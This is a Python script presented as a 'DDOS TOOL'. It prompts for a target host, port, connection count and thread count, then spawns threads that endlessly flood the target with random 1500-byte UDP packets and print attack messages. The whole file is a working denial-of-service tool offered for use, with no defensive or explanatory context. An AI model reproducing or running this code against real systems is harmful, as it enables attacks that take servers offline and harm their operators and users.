import random
import socket
import threading
import time
import os


print("""
\u001b[31m
  > DDOS TOOLS BY : Ben
  > Coded : -
  > Can Down Normal Server In A Ssc
  > VIP TOOLS
""")


ip = str(input("   \u001b[31m[X] \u001b[37m@DDOS ════> Ip/Host :\u001b[31m  "))
print(" ")
port = int(input("   \u001b[31m[Y] \u001b[37m@DDOS ════> Port Server :\u001b[31m  "))
print(" ")
times = int(input("   \u001b[31m[Z] \u001b[37m@DDOS ════> Connections :\u001b[31m  "))
print(" ")
threads = int(input("   \u001b[31m[X] \u001b[37m@DDOS ════> Threading :\u001b[31m  "))
time.sleep(1)

# Attack
def wt():
	data = random._urandom(1500)
	i = random.choice(("[€]","[¥]","[✓]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i,f"\u001b[33m [¥] @DDOS ════> \u001b[31mAttack To Ip \u001b[37m{ip} \u001b[31mOn Port \u001b[37m{port}")
		except:
			print(i,f"\u001b[33m [¥] @DDOS ════> \u001b[31mAttack To Ip \u001b[37m{ip} \u001b[31mOn Port \u001b[37m{port}")

# Threads
for y in range(threads):
	th = threading.Thread(target = wt)
	th.start()